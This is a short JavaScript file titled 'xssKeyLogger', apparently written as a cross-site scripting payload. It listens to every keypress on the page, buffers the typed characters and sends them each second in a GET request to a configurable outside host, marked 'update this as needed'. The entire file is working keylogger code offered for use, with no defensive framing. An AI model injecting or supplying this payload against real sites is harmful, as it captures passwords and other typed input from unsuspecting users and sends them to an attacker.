/**
 * xssKeyLogger
 *
 * Create a listener to send keystrokes back to a server
 *
 */

/**
 * update this as needed
 */
const ipAddress = '127.0.0.1';

// construct the target url
const url = `http://${ipAddress}/keys=`;

// store keypresses in a buffer
let keyBuffer = '';

// set up keypress listener
document.onkeypress = function(event) {
    keyBuffer += event.key;
};

window.setInterval(function() {
    if (keyBuffer.length > 0) {
        // Construct and send the request
        var xmlHttp = new XMLHttpRequest();
        xmlHttp.open('GET', url + keyBuffer, true);
        xmlHttp.send();
        keyBuffer = '';
    }
}, 1000);
